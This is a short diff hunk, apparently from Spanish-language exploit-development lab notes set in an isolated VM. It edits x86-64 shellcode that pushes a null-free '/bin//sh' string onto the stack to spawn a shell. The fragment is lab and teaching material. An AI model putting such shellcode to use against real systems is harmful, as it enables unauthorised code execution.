@@ -74,7 +74,7 @@ Trabaja en la VM aislada. Los binarios de prueba se compilan con `-z execstack` 
    _start:
        xor  rsi, rsi            ; argv = NULL  (sin bytes nulos)
        push rsi
-       mov  rdi, 0x68732f6e69622f ; "/bin/sh\0" invertido
+       mov  rdi, 0x68732f2f6e69622f ; "/bin//sh" (8 bytes, sin byte nulo)
        push rdi
        mov  rdi, rsp            ; rdi -> "/bin/sh"
        xor  rdx, rdx            ; envp = NULL
